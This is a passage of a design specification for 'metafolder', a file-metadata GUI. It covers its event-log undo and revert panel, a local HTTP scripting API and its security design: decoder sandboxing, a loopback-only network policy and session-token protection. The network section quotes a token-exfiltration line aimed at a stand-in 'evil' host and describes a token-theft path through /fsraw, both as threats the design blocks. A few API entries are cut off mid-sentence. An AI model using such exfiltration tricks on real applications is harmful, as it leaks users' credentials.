rather than "silently un-ignore everything else". A target that already has its
own set, or that inherits nothing, is written without a prompt.

*** File manager integration

The =file-manager= panel is where ignoring is naturally decided, so it both
*shows* and *offers* it:

- *Showing.* After a listing is enriched, the panel batches its entries into one
  =eligibility_explain= call and marks the excluded ones (dimmed row + a muted
  =ignored= marker, with the matching pattern and its source in the row's
  tooltip). Only =reason = "ignored"= is marked: an untracked entry in a repo
  that simply is not watched yet is not "ignored", and dimming the whole listing
  would be noise. The call is skipped when there is no active repo.
- *Offering.* The row context menu gains an *Ignore* submenu: /this path
  exactly/, /every =<ext>= here/, and /apply a preset…/. The first two build the
  pattern from the row's path re-anchored at the tracking scope
  (=watch_scope= from the same explain call — patterns are matched relative to
  it, not to the repo root), regex-escaping the literal parts. Both go through
  the copy-on-write prompt above, and both target the *current directory*, not
  the row.

The listing is re-enriched after any ignore write, so the effect is visible
immediately rather than at the next reconcile. Ignoring a path never deletes an
existing metarecord: it only stops future tracking (spec-file-tracking
"Behaviour when =mf_watch= or =mf_ignore= changes").

** Event log

*** Log view (=log= panel type)

Displays revisions in reverse chronological order. Columns: =rev_id=,
timestamp, operation count, =status=.

The =status= column carries the badges that say what a revision *is* — which is
what decides whether undoing it makes sense:

- =HEAD= — where the history stands;
- =watcher= — the daemon wrote it for the filesystem (=revision.origin=, see
  [[file:spec-event-log.org][spec-event-log.org]] "Revision origin"; on a
  pre-migration database, judged by the operation types). The row is dimmed:
  it is not the user's to undo, and =log:undo= skips it;
- =undo of #N= — the revision is itself a revert of =#N=;
- =undone by #N= — a later revert already put it back; its number is struck
  through, and asking to revert it again says so before confirming.

An expanded operation carrying =reverts_op_id= names the operation it reverted,
and one that has been reverted is marked =undone=, so a correction and its cause
are readable from one another in both directions. A =Graph= checkbox
(command =log:toggle graph=) switches the presentation, refetching the log:

- Unchecked (default) — calls =GET .../log?mode=active=: the active line
  through HEAD only. After a rollback the most-recent forward continuation
  stays listed (so the user can navigate forward again), but revisions on
  divergent branches are hidden.
- Checked — calls =GET .../log?mode=tree= and draws every branch as a graph:
  a leading monospace gutter cell with connector rows, the active line in the
  leftmost column and divergent branches opening a column to the right.

A click — or =up= / =down= (also =k= / =j=), via =log:prev= / =log:next= —
moves the selection (over every listed node, in either presentation). A double
click or =Enter= (=log:toggle ops=) expands the revision to show its individual
operations (and collapses it again).

*The selection reaches into an expanded revision.* Its operations are rows of
their own: the cursor walks them, a click picks one, and a revert then targets
*that operation alone* (=op_ids=) instead of the whole revision. This is what
makes "undo just this one field of what I did" a keystroke rather than a trip to
=mf log revert --op=. =log:revert op= narrows from a revision row (expanding it
and, when it holds more than one operation, asking which); =log:revert revision=
widens back.

A status line under the list says how much log there is: the number of
revisions and operations currently listed and, when the fetched window is only
part of the log, the repository-wide totals it was cut from
(=total_revisions= / =total_operations= of =GET .../log=) — so "Show older
operations" has a visible destination.

*** Revision commands

- =log:rollback= → confirmation → =POST .../rollback= targeting the last
  operation of the selected revision. The target may be an ancestor
  (rollback) or a descendant / another branch (redo): the same command
  navigates in both directions, which is also how a rollback is undone.
  Refreshes =metarecord-list= and =metarecord-detail= afterwards (=metarecords:dirty=).
- =log:undo= / =log:redo= — shell builtins (they work without the log
  panel, defaults =ctrl+z= / =ctrl+shift+z=; the log panel also has Undo /
  Redo toolbar buttons).

  Undo undoes the newest change *the user* made, and picks the mechanism for
  it: the [[file:spec-event-log.org][spec-event-log.org]] "Undo" selection,
  shared with =mf log undo= through =core::undo=. A rollback when the user's
  change is the last thing in the log (={"prev_revision": true}=), a revert
  when the watcher has written since. A revert that is blocked, or that needs
  a filesystem action, is *reported* rather than forced: the message names
  =log:revert with-dependents= or =mf log undo=, because neither is something
  to do behind the user's back.

  Redo is its mirror — the [[file:spec-event-log.org][spec-event-log.org]]
  "Redo" selection, also from =core::undo=: HEAD forward onto what an undo's
  rollback unapplied (=GET .../log?mode=active= carries that continuation), a
  rollback over the revert an undo wrote, or a revert of that revert when the
  daemon has written since. So a redo survives the watcher having moved a file
  between the undo and it, which is the whole reason it is not simply "HEAD
  forward one revision". When the newest thing the user wrote is an ordinary
  change rather than an undo, there is nothing to redo.

  Neither prompts: the operation is itself undoable, that is the point.
  Refreshes the panels through =metarecords:dirty=.
- =log:revert= → =GET .../revert/plan= for what is selected — the revision, or
  the single operation when the cursor is on one — then a confirmation naming
  how many operations it would undo (and warning when the target has already
  been undone), then =POST .../revert=. Refreshes the panels through
  =metarecords:dirty=.

  A plan needing filesystem actions is *not* driven from the panel: it says so
  and names =mf log revert <rev>=, which holds the lock while it moves the
  files. Driving that from the GUI would mean holding a lock across a dialog,
  and a window left open would freeze the repository's writes.

- =log:revert with-dependents= → the same, on the dependency closure
  (=with_dependents=true=): the target plus everything blocking it. It always
  confirms, naming how many operations were pulled in — how far a closure
  reaches is exactly what the target does not tell you.

  A blocked plan does not open the revert dialog. The panel selects the
  blocking operation's revision and says which operation stands in the way, so
  "revert that one first" is one keystroke away, and it offers the other exit —
  reverting the blockers along with the target (=with_dependents=, see
  [[file:spec-event-log.org][spec-event-log.org]] "Reverting the dependents
  too") — naming how many operations that would add before it is confirmed. This is the case rollback cannot
  express — the blocking revision may be far younger and entirely unrelated —
  and it is the reason a watched repository needs a revert at all: the watcher
  writes a revision per batch of filesystem events, and rolling back past dozens
  of them to undo one rename is not what the user meant.

- =log:mark= → =PATCH .../log/revisions/:rev_id=.

*** Prune log

=log:prune= opens a dialog (target revision or "keep last N revisions") and
calls =POST .../log/prune=.

** Scripting / GUI API

The GUI exposes a local HTTP API on =127.0.0.1:7524= (=gui-port= in
=gui/config.toml=, overridable with =--gui-port=). External scripts can drive
the GUI: set panel types, display messages, wait for user input.

All endpoints are available as long as the GUI is running, regardless of
daemon connectivity.

*** =GET /gui/workspaces=

Returns the list of all open workspaces.

#+BEGIN_SRC json
[
  {"id": "ws-1", "name": "Workspace 1", "active_repo": "<repo_uuid>"},
  {"id": "ws-2", "name": "Workspace 2", "active_repo": null}
]
#+END_SRC

*** =POST /gui/workspaces=

Creates a new workspace. Returns its id.

Request body (all fields optional):
#+BEGIN_SRC json
{"active_repo": "<repo_uuid>", "task": "script-3"}
#+END_SRC

If =active_repo= is absent, the workspace uses the daemon's first loaded
repository (from =GET /repos=), or =null= if no repositories are loaded.

=task= is the run id of the script creating the workspace
(=METAFOLDER_GUI_TASK=, sent by =mf gui workspace new=): the new workspace then
belongs to that script (see [[*Script session]]). An absent or unknown run id
claims nothing.

Response: ={"id": "ws-3"}=

*** =DELETE /gui/workspaces/:id=

Closes a workspace. Any slot that had this workspace assigned switches to
the previous workspace in tab order (the next one when the first tab was
closed; a slot hidden by =panel:unsplit= stays hidden), or becomes
unassigned (shows "No workspace selected") when no workspace remains.
Returns =204 No Content=.

*** =GET /gui/workspaces/:id/vars/:key=

Reads one workspace variable: ={"value": <json>}=. A variable never set reads
back as ={"value": null}= (=200=) — "nothing published yet" is an answer a
script falls back from; only an unknown workspace is =404=. A script is a
subprocess and sees nothing of the GUI's state otherwise; =mf gui query= is
built on this.

*** =GET /gui/layout=

Returns the current slot assignments.

#+BEGIN_SRC json
{"left": "ws-1", "right": "ws-2"}
#+END_SRC

A slot value of =null= means the slot is hidden (no workspace assigned).

*** =PUT /gui/layout=

Assigns workspaces to slots. Only the keys present in the request body are
updated; omitted keys are unchanged.

#+BEGIN_SRC json
{"left": "ws-1", "right": "ws-2"}
#+END_SRC

Setting a slot to =null= hides it. Returns =200 OK=, body ={}=.

*** =PUT /gui/panels/:slot/view=

Sets the panel type displayed in slot =:slot= (=left= or =right=). If the slot
is hidden, it is shown first.

Request body examples:

#+BEGIN_SRC json
{"type": "metarecord-list"}
{"type": "metarecord-detail"}
{"type": "file", "path": "/absolute/path/to/image.jpg"}
{"type": "message"}
{"type": "log"}
{"type": "my-custom-panel", "state": { ... }}
#+END_SRC

When =type= is =file= and =path= is provided, the workspace variable
=selected_paths= is set to =[path]= and =selected_metarecord= is set to the
matching metadata metarecord (or =null= if the file is untracked). Omitting =path=
leaves =selected_paths= unchanged and the =file= panel type displays whatever
path was already active.

Response: =200 OK=, body ={}=.

*** =GET /gui/panels/:slot/view=

Returns the current panel type descriptor for slot =:slot=, including a
=status= field (="loading"= / ="ready"=).

*** =POST /gui/command=

Runs an arbitrary command invocation through the *same dispatcher the command
input and keybindings use* — there is a single command path, so internal and
external invocation stay in lockstep. The =invocation= string is parsed exactly
like command-input text (whitespace-separated name and arguments, quotes
honoured); a leading =!= runs a shell command.

The request blocks until the command resolves: the GUI shell runs =dispatch()=
and reports the outcome. Unlike =POST /gui/input= / =POST /gui/prompt=,
concurrent command calls are allowed (each gets its own id), since this is
external control rather than a modal wait.

Request body:
#+BEGIN_SRC json
{"invocation": "panel:set type file", "timeout_ms": null}
#+END_SRC

Responses: ={"event": "ok"}= / ={"event": "error", "message": "unknown command: …"}=
/ ={"event": "timeout"}= / ={"event": "closed"}=. A missing or empty
=invocation= is a =400=.

Note: the call resolves when =dispatch()= and its awaited work complete, which
for commands that open or refresh a panel does *not* include the panel's own
asynchronous render inside its iframe.

*** =GET /gui/bench= / =POST /gui/bench/clear=

The profiling harness (see [[*Bench harness]]). Panels time their phases with
=metafolder.bench.measure= and the shim auto-instruments every daemon call;
each measure is reported to the shell, which appends it to an in-memory buffer.
=GET /gui/bench= snapshots that buffer; =POST /gui/bench/clear= empties it.

{"records": [
  {"name": "mf:daemon POST /repos/:id/query", "duration_ms": 8.4},
  {"name": "mf:list:enrich", "duration_ms": 3.1},
  {"name": "mf:list:render", "duration_ms": 2.0}
]}

A driver script clears the buffer, runs a reproducible scenario through
=POST /gui/command=, then reads the per-phase timings back.

*** =POST /gui/message=

that workspace's =message= panel type log. An optional =?workspace_id=<id>=

Request body:
#+BEGIN_SRC json
{"text": "← left  → right  Esc to stop", "timeout_ms": null}
#+END_SRC

*** =POST /gui/progress=

Updates the running script's loading indicator in the [[*Task bar]]. =task= is

script; =done=/=total= drive a determinate progress bar, =phase= labels the
current step. Only the provided fields are overwritten; an absent or unknown

*** =POST /gui/input=

Registers an input wait and blocks until the =answer:send= command is
executed (by any means: the awaited-key interception described below, a
permanent user binding, or a manual invocation via the command input).

The optional =keys= array is the set of keys the wait accepts. A key the GUI
reserves (=escape=, the command-input and script-keys combos — see
[[*Reserved keys]]) is refused: the whole call fails with =400= and no wait is
registered, so the next script is free to ask. While the
wait is active these keys take *absolute priority* over normal keybindings:
pressing one answers the script (=answer:send <key>=) and never also fires a
panel/global shortcut bound to the same key — so a script offering =y/n/s=
is never in conflict with an =n= binding in the focused panel. Keys the wait
does *not* list keep their normal behaviour. (The temporary bindings are
also installed as a fallback for manual/user resolution, but the awaited
keys are intercepted ahead of the matcher so scope precedence cannot let a
more-specific binding win.) The user can hand them all back at the question
bar's checkbox ([[*Script keys]]), which removes those temporary bindings.

If =keys= is absent or empty, no keys are
awaited; the user can still resolve the wait by typing =answer:send <value>=
manually in the command input.

The optional =prompt= is the *question* to show while the wait is active. It
is displayed in a dedicated bar (see [[*Status bar]]), kept apart from the
status/error line so a message cannot hide it, together with the =keys= the
wait accepts. Absent =prompt= ⇒ a generic "Waiting for input" label.

Only one =POST /gui/input= at a time; concurrent calls return =409=.

The optional =task= is the asking script's run id (=METAFOLDER_GUI_TASK=). It
scopes the question to the workspaces that script owns and marks its task-bar
entry "awaiting an answer" for the lifetime of the wait (see
[[*Script session]]). Absent or unknown ⇒ the wait is owned by nobody.

Request body:
#+BEGIN_SRC json
{"keys": ["left", "right", "escape"], "prompt": "Which action?",
 "task": "script-3", "timeout_ms": null}
#+END_SRC

Responses: ={"event": "answer", "value": "left"}= / ={"event": "timeout"}= /
={"event": "closed"}=.

The =input-wait-changed= event the shell consumes carries =active=,
=temp_keys=, =prompt=, =workspaces= (the owning script's workspaces, empty
when unowned), =task= (the owning run id, so escape knows which script to stop)
and =script_keys= (the checkbox state). It is re-emitted, with the keytable,
whenever the checkbox flips.

*** =POST /gui/prompt=

Activates the command input with a custom prompt. Blocks until =Enter= or
=Escape=. Mutually exclusive with =POST /gui/input= (same lock).

Request body:
={"prompt": "Enter a rating (1-5): ", "completions": [], "task": "script-3",
  "timeout_ms": null}=

=task= is the asking script's run id, as for [[*=POST /gui/input=]]: it marks
that script's task-bar entry "awaiting an answer" while the prompt is up.

The optional =completions= array is offered by the command input's
autocomplete while the prompt is active (same prefix-then-substring
ranking and Tab/arrow navigation as command completion; accepting a value
writes it into the input without submitting). The user may still type any
free-form answer.

Responses: ={"event": "confirm", "text": "4"}= / ={"event": "cancel"}=.

*** CLI: =mf gui=

The =mf= CLI exposes the scripting API as plain-text subcommands, so shell
scripts need neither =curl= nor =jq=. The GUI base URL comes from
=--gui-url= / =METAFOLDER_GUI_URL=, else =gui-port= in the GUI
=config.toml= (see [[*GUI API port persistence]]), else the default
=http://127.0.0.1:7524=.

| Command                                              | Effect                                                             |
|------------------------------------------------------+--------------------------------------------------------------------|
| =mf gui status=                                      | =GET /gui/status=, pretty-printed JSON                             |
| =mf gui repo=                                        | Prints the active repo of the focused workspace (exit 1 if none)   |
| =mf gui query [--workspace <id>]=                    | Prints the query a script should run on: the checkbox selection (=selected_metarecords=, bare UUIDs OR-ed), else =metarecord-list:effective-query-text= — the precedence of the bulk commands; an empty line = every metarecord; exit 1 when the list has not run (never read as "all") |
| =mf gui workspace new [--repo <uuid>]=               | Creates a workspace, prints its id                                 |
| =mf gui workspace rm <id>=                           | Closes a workspace                                                 |
| =mf gui layout [<slot> [<ws or ->]]=                 | Prints both slots / one slot / assigns (=-= hides the slot)        |
| =mf gui view <slot> [<type>] [--path] [--state]=     | Prints or sets the panel type of a slot                            |
| =mf gui message <text> [--workspace] [--timeout-ms]= | Posts a status bar message                                         |
| =mf gui progress [--done N] [--total M] [--phase P] [--task ID]= | Updates the running script's task-bar indicator (=--task= defaults to =METAFOLDER_GUI_TASK=; no-op outside the GUI) |
| =mf gui command <invocation>... [--timeout-ms]=      | Runs a command invocation through the GUI (exit 1 on error/timeout) |

| =mf gui input <key>... [--prompt <text>] [--timeout-ms]= | Waits for one of the keys, prints it (=--prompt= shows a question in the dedicated bar; exit 1 on timeout/close, or on a [[*Reserved keys][reserved key]]) |
| =mf gui prompt <text> [--completion <v>]... [--completions-stdin] [--timeout-ms]= | Prompts in the command input, prints the answer (exit 1 on cancel) |

=mf gui prompt --completions-stdin= is how a script obtains a *missing argument*
through the GUI's completion UI rather than only from its command line: it reads
the candidate list on stdin and returns the confirmed value. The bundled scripts
share thin wrappers over it in =scripts/shipped/lib/mf-gui.sh= — =mf_gui_prompt= (generic,
completions on stdin), =mf_gui_prompt_tag= (over the tag vocabulary), and
=mf_gui_prompt_folder= / =mf_gui_prompt_file= (over the repository's tracked
directories/files, resolved in one =mf metarecord … get --resolve-tree mfr_path=
round-trip and paired with =mf_gui_path_uuid= to map the chosen path back to a
metarecord). So e.g. =gui-tag-folder.sh= takes its tag either as a positional
argument *or*, when omitted, from the GUI completion.

**** A query is the scope

A shipped script that acts on a set takes that set as a *query*, and the query
is the boundary: =gui-tag-folder.sh= answering "yes" on a folder applies to
=(<query>) AND mfr_path ->* "<path>"=, never to a metarecord the query excludes.
The query comes from, in order: the argument; else =mf gui query= (what the GUI
shows — the checkbox selection, else the list's query with its finder
narrowing); else the folder completion, turned into =mfr_path =>* "<folder>"=.
An empty query means every metarecord and is used as such, never wrapped
(=() AND …= is not a query). The scope is resolved *before* the session
takeover, since the scratch workspace publishes nothing.

*The query is also the walk state.* An answer is a *write*, so "what is left to
ask" is a query rather than bash bookkeeping: =gui-tag-folder.sh= asks one
question per step with =--limit 1= over =<scope> AND <not yet decided> AND <not
skipped>=, and every answer takes its subject out of that set — a folder
answered whole takes its subtree with it, since the tag is written over it.
Nothing is read up front, nothing is held in an array, and there is no scope
cap; the counter is a =--count= over the same predicate, so it is exact and
drops by a whole subtree at once.

The walk is depth-first and holds one string, the current folder — *the path is
the stack*, going up is trimming one component. At folder =P=: the first
undecided direct child in scope (folders first, each kind by
=--sort order_dir=/=order_file= then =--sort mfr_path=, so a folder =mf order=
has numbered is walked in its own order); else the first undecided in-scope
*descendant* of =P= by path, whose parent becomes the current folder — which is
what reaches a *scattered* scope, where =/a= is excluded and =/a/b/c.txt= is
not, skipping every empty level in one step; else up one component, and above
the repository root the walk is done. The repository root is nobody's child, so
the first step asks for the forest root (=mfr_path:parent IS ABSENT=) beside the
root's own children. A script never runs =mf order= itself: numbering is a
deliberate act, and its date-based fallback would walk worse than alphabetical.

A *skip* is recorded like any other answer, as a =gui_tag_skipped= field
holding a *ref to the tag entry* — one marker per tag, so a skip on =music=
never silences the same entry for =jazz=, and one clause
(=NOT gui_tag_skipped -> (…)=) in the query whatever the number of skips. It
therefore survives the run, is undone by =back= like any other answer, and is
offered for cleanup when the run ends and again at the next run's start, which
is where the choice is informed.

=gui-unwatch-folder.sh= is the deliberate exception: a query matches
metarecords that already exist, and the folder to stop watching often has none
yet — which is why its argument is a filesystem path it tracks on the fly, so
=mf_watch= has somewhere to live. =mf_watch= is a per-directory field inherited
down the tree, so a folder, not a set, is the shape of what is being said.

*** Example: image comparison script

#+BEGIN_SRC bash
#!/usr/bin/env bash
GUI="http://127.0.0.1:7524"

# Create two dedicated workspaces for the comparison
WS_LEFT=$(curl -s -X POST $GUI/gui/workspaces \
               -H "Content-Type: application/json" -d '{}' | jq -r .id)
WS_RIGHT=$(curl -s -X POST $GUI/gui/workspaces \
                -H "Content-Type: application/json" -d '{}' | jq -r .id)

# Assign them to the two panel slots
curl -s -X PUT $GUI/gui/layout \
     -H "Content-Type: application/json" \
     -d "{\"left\": \"$WS_LEFT\", \"right\": \"$WS_RIGHT\"}"

while true; do
  A=$(find /photos -name "*.jpg" | shuf -n1)
  B=$(find /photos -name "*.jpg" | shuf -n1)

  curl -s -X PUT $GUI/gui/panels/left/view \
       -H "Content-Type: application/json" \
       -d "{\"type\":\"file\",\"path\":\"$A\"}"
  curl -s -X PUT $GUI/gui/panels/right/view \
       -H "Content-Type: application/json" \
       -d "{\"type\":\"file\",\"path\":\"$B\"}"
  curl -s -X POST "$GUI/gui/message?workspace_id=$WS_LEFT" \
       -H "Content-Type: application/json" \
       -d '{"text":"← left  → right  Esc to stop"}'

  RESP=$(curl -s -X POST $GUI/gui/input \
              -H "Content-Type: application/json" \
              -d '{"keys":["left","right","escape"]}')
  KEY=$(echo "$RESP" | jq -r .value)

  [ "$KEY" = "escape" ] && break

  WINNER=$( [ "$KEY" = "left" ] && echo "$A" || echo "$B" )
  # metarecord winner as metadata via daemon …
done

# Clean up the temporary workspaces
curl -s -X DELETE "$GUI/gui/workspaces/$WS_LEFT"
curl -s -X DELETE "$GUI/gui/workspaces/$WS_RIGHT"
#+END_SRC

* Resolved design decisions (v1)

** Frontend framework

Svelte 5 + Vite for the shell. Built-in panel types are plain HTML/JS (no
build step) so users can read and copy them as examples.

** =metafolder= API delivery mechanism

Panel types run **in the shell's JS realm**, not in iframes. Each instance
(one per (workspace, panel type), kept alive while hidden for state retention,
never reparented) is a host element with its own **Shadow DOM** root for CSS
isolation. The shell fetches the panel's =index.html= into the shadow root
(scripts stripped), =import()=s its =main.js= and calls the contract
=export function mount(root, metafolder)= (returning an optional cleanup
function). =metafolder= is a plain object whose methods call the Rust backend
directly — there is no =postMessage= bridge. Because everything shares one
realm, panel key events bubble to the shell's single key matcher (text-input
detection pierces shadow roots via =composedPath()=).

This abandons iframe isolation deliberately: it lets a later shared data cache
live in the realm and be read by every panel without per-access copies. Panels
are **trusted code** (they already have filesystem and shell access through the
API — see [[*Custom panel type trust model]]); a throw in =mount= is contained
by an error boundary, but a panel can otherwise touch shared state.

A corollary: the same panel type cannot be displayed in both slots for the
same workspace (one instance cannot render twice); =panel:set type= rejects
this with a status bar error.

** Daemon access

Panels and the shell reach the daemon through the Rust backend (a reqwest
proxy exposed as =metafolder.daemon.request=). The WebView cannot call the
daemon directly (CORS), and the daemon stays GUI-agnostic.

** Data cache

Because panels share one JS realm, a single in-realm cache holds daemon data —
read directly by every panel, no per-panel copy. It has three stores per repo:
metarecords (=uuid → metarecord=), TreeRef paths (=(uuid, field) → [path]=) and
query results (=query → [uuid]=).

Panels use =metafolder.cache=: =query(repo, body)= (returns the page's uuids +
=nextCursor=/=total=, populating the entity store from a =select '*'= result),
=fetchMetarecords= / =fetchTreeRefs= (fetch only the uuids not already cached),
and the synchronous =readMetarecord= / =readTreeRef= used during render —
returning =cache.REFRESH= when the datum is absent/invalidated, on which the
panel renders a placeholder and schedules a refresh. So a metarecord-list query
populates the entities the metarecord-detail panel then reads for free (the
list↔detail dedup). =daemon.call= stays for writes and non-cacheable endpoints;
its query / single-metarecord / batch / tree-resolve reads are also served from
the cache transparently. Cached data is read-only — panels never mutate it.

Freshness comes from the daemon change feed (=GET /log/since=, see
[[file:spec-event-log.org][spec-event-log]]): a background poll (~7 s) plus
deliberate points (a query, a refresh, a panel becoming visible) compare the
log =head=; on a change the touched metarecords are invalidated by delta (fine)
and query results cleared (coarse). A panel's own write invalidates the edited
metarecord immediately. Memory is bounded by LRU eviction (reads keep an entry
recent; an evicted datum is simply re-fetched on the next read).

What counts as a write is decided by method and path: any non-GET that is not a
recognised read. Several daemon *reads* are POSTs because a body carries the
query or the path (=query=, =query/fields/resolve-tree=, =tree/resolve-path=,
=orphans/scan=, =schema/check=), and they must be listed as such. Mistaking a
read for a write is not merely wasteful: the invalidation moves the repository's
cache epoch, and a read already in flight is then discarded rather than cached —
the panel that asked for it reads =REFRESH= where it expected data. Panels must
treat that as *unknown*, never as *absent*: a =readTreeRef= that has not landed
yet says nothing about where a file is, and reading it as "no path" is how a
perfectly healthy row ends up marked as an orphaned metarecord.

** Commands targeting an absent panel type

Commands registered by a panel type whose instance is not mounted yet in
the focused workspace are dispatched after lazily creating the hidden
instance. Commands registered with =reveal: true= (e.g. =metarecord:create=,
=log:rollback=) additionally switch a slot to the owning panel type first:
the other slot when it shows the same workspace, otherwise the focused
slot. Limitation: a panel type's commands only exist in the registry once
the panel has been instantiated at least once in the session.

** Path display

Path resolution runs **daemon-side**, in one round-trip whatever the depth:
=POST /repos/:repo/query/fields/resolve-tree= ={ query, field? }= walks each
matching metarecord's TreeRef positions through the in-memory tree cache and
returns repo-root-relative paths (the explicit-UUID case uses a =uuid_in= query).
It is general over any TreeRef field (=mfr_path= by default) and multi-map
(an array per metarecord; stale positions skipped). A single metarecord can also
use the direct =GET …/metarecords/:uuid/fields/:name/resolve-tree=. The CLI's =mf path= and the
GUI shim's =metafolder.daemon.resolvePath= / =resolveTreeRef= /
=metarecordPaths= are thin wrappers over it (the shim keeps a per-repo memo
cache; =invalidatePath= drops one metarecord after a move); =repoRoot= gives the
absolute root. Panels that render many rows resolve a whole page in batch when
it is fetched (see the =metarecord-list= data/view split) rather than per cell —
rendering itself makes no daemon calls.

** GUI API port persistence

The GUI binds the =gui-port= configured in =~/.config/metafolder/gui/config.toml=
(default 7524; overridable with =--gui-port=). The CLI reads that same
=config.toml=, so the port is a fixed, shared setting — there is no runtime
=gui.port= discovery file to write or clean up.

** Concurrent script sessions

Only one =POST /gui/input= / =POST /gui/prompt= wait at a time; concurrent
calls fail immediately with =409= (no queueing).

** Panel type update strategy

Resolved by the git-backed config repository: =metafolder-sync-config= merges
the shipped =default= branch into the user's =main= branch (see
[[file:spec-config.org][spec-config]]).

** Bench harness

A JS profiling harness for finding GUI slowness, built on the existing single
command path rather than a parallel control API.

Mechanism:
- Panels wrap their phases with =metafolder.bench.measure(name, fn)= and the
  shim auto-instruments every daemon round-trip. Built-in labels:
  =mf:list:enrich= / =mf:list:render=, =mf:detail:load= / =mf:detail:render=,
  =mf:fm:load= / =mf:fm:render=, and =mf:daemon <method> <path>=.
- Each measure is both a =performance.measure= (visible in the WebKit inspector
  Timeline) and a report to the shell, appended to an in-memory buffer.
- =GET /gui/bench= reads the buffer, =POST /gui/bench/clear= empties it.
- A scenario is driven externally with =POST /gui/command= (the same
  =dispatch()= the command input uses), so internal and external invocation
  stay identical. =scripts/bench-gui.sh= runs the built-in scenarios (panel
  opens, list+detail navigation, file-manager navigation, paging), clearing the
  buffer before each and printing the per-phase timings after.

Because a panel's render happens asynchronously inside its iframe, the
=POST /gui/command= call alone cannot time it — the harness's per-phase reports,
not the command's resolution, are the source of truth for render cost. The
=metarecord-list:page next= command loads the next page on demand (the
scriptable equivalent of scrolling to the bottom) so paging can be driven
reproducibly.

** Untrusted media (resolved: sandbox every decoder)

Panel types are trusted code (see [[*Custom panel type trust model]]), but the
*files they display are not*. Images and video are decoded by large C libraries
with a long history of memory-safety bugs, and in metafolder that decoding
happens **passively**: a thumbnail is generated and a codec probe is run for any
file that merely appears in a panel, without the user opening it. A crafted file
is therefore a plausible code-execution vector, reached just by browsing a
directory. The same holds for a *document*: a PDF is parsed by poppler the
moment its tile or its preview is shown. Every decoder is confined:

- =ffmpeg= (=GET /thumbnail=), =pdftoppm= / =pdfinfo= (=GET /thumbnail= for a
  document tile, =GET /document*= for the preview — see [[*Documents]]) and
  =gst-discoverer-1.0= (=GET /__media-probe=)
  run under =bwrap= (=crates/gui/src/sandbox.rs=): no network, no IPC/PID/user
  namespace sharing, an empty environment, a read-only system, and *only the
  examined file* bound read-only — plus, for the two renderers, the cache
  directory they write the image into, the single thing they may write. The GStreamer
  plugin registry is bound read-only (=GST_REGISTRY_UPDATE=no=): without it the
  sandbox has no registry and rebuilds one per probe (~1 s against ~80 ms).
  These helpers **fail closed** — no sandbox, no helper, and the panel falls
  back to a glyph.
- The same helpers carry **rlimits** (=setrlimit= between fork and exec, so
  =bwrap= and everything it spawns inherit them): 2 GiB of address space, 30 s
  of CPU, 64 MiB per file written, no core dump. =bwrap= bounds what a decoder
  can *reach*; these bound what it can *consume* — the wall-clock timeout in
  =proc= only kills a process still *running*, and does nothing about a machine
  already thrashing on a 30 GiB allocation, or a disk filling up. They are
  generous: a 1080p poster extraction (~10 KiB PNG) is untouched by them.
- The WebView's own web process (=<img>= / =<video>= on =/fsraw=) is confined by
  =WEBKIT_FORCE_SANDBOX=1=, set before the WebView is created. =wry= never
  enables WebKit's sandbox, so without this the web process decodes untrusted
  media unconfined. It cannot be enabled later:
  =WebContext::set_sandbox_enabled= aborts the application once a web process
  has been spawned, which Tauri has already done by =setup=.

The GUI **verifies** this rather than assuming it: at startup a real =bwrap=
sandbox is created as a probe, and five seconds in, WebKit's web process is
checked for a user namespace of its own. Either failing is fatal —
rendering a crafted file unconfined is a hole, not a degraded feature.
=WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS= in the environment is likewise fatal.
=--allow-unsandboxed-webview= is the one escape hatch (a loud warning, a per-run
flag with no =config.toml= equivalent so it cannot rot into a permanently
disabled sandbox): it exists for development inside containers that forbid
bubblewrap — WebKit's sandbox mounts =/proc=, which some container policies
refuse, while the media helpers avoid =/proc= and work there.

Bubblewrap is thus a **hard runtime dependency** of the GUI, unlike ffmpeg and
the GStreamer plugins (whose absence only disables a feature).

Not sandboxed, deliberately: =!= shell commands (the user typed them) and
=gst-inspect-1.0= (reads the plugin registry, never a user file).

** No network access (resolved: loopback only)

Metafolder never talks to the internet, and nothing in it *can*. Audited across
the workspace, the surface is:

- *Listening*: the daemon (=127.0.0.1:7523=) and the GUI server
  (=127.0.0.1:7524=) bind loopback only, both behind the session token.
- *Outgoing (Rust)*: =reqwest= (GUI → daemon) and =ureq= (CLI → daemon) build
  loopback URLs only, redirects disabled. =git2= (=config_sync=) performs no
  remote operation — no fetch, push or clone. The media helpers run with
  =--unshare-net= (see [[*Untrusted media]]): no network interface at all.
- *Tauri*: =core:default= capability only — no =http= plugin, no =shell= plugin.
- *The WebView* is the one real risk: a full browser engine, in the realm that
  holds the session token, the =fs= API and =!= shell commands. Two gates keep
  it off the network, and they are complementary:
  1. A *Content-Security-Policy* (=tauri.conf.json=; it was =null=, i.e. no
     policy at all) whose every source expression is local: =default-src
     'self'=, plus loopback for the panel assets, =/fsraw= and =/thumbnail=
     (the GUI port is configurable, hence =http://127.0.0.1:*=), plus Tauri's
     IPC. No remote origin is reachable by =fetch=, =<img>=, =import()= or any
     other subresource. =object-src=/=frame-src= are ='none'= — the [[*=/fsraw=:
     media, never a document]] invariant, stated again where the browser
     enforces it.
  2. A *navigation policy* (WebKit =decide-policy=, =sandbox::is_local_navigation=):
     no CSP directive governs top-level navigation, so
     =location.href = 'https://evil/?' + token= would otherwise still leave,
     carrying whatever it liked in the URL. Any navigation outside the app's own
     origins is refused (an unreadable target too — fail closed).

The one deliberate exception is =!= shell commands: the user typed them, and
they can obviously run =curl=.

Guarded by =crates/gui/tests/network_surface.rs= (the CSP admits no remote
source) and the =sandbox= navigation tests.

** =/fsraw=: media, never a document

=/fsraw= serves arbitrary local files and carries the session token in the URL
(=?token=…=), because an =<img>= =src= cannot send an =Authorization= header.
This is safe only as long as the file is loaded as *data* — an =<img>=,
=<video>= or =<audio>= source — where even an SVG carrying a =<script>= does not
execute.

Loaded as a *document* (=<iframe>=, =<object>=, =<embed>=, a navigation), the
same file becomes *code* in the GUI server's origin: it could read
=location.search=, lift the session token out of its own URL, and drive the whole
=/gui/*= scripting API — including =POST /gui/command= and the =!= shell
commands. Previewing a file would be a full compromise.

No panel may load an =/fsraw= URL as a document. The shipped panels are checked
by =crates/gui/tests/panel_invariants.rs=. A panel that genuinely needs a
document view would first have to stop passing the token in the query string.

* Open questions

** Custom panel type trust model (resolved: trusted)

The =metafolder.fs= API gives panel types unrestricted filesystem access and
=commands.invoke('!…')= runs arbitrary shell commands, so the iframe was never
a security boundary against panel code — the boundary is Tauri's capability
layer (GUI ↔ OS). Panel types are therefore treated as **trusted code**, and
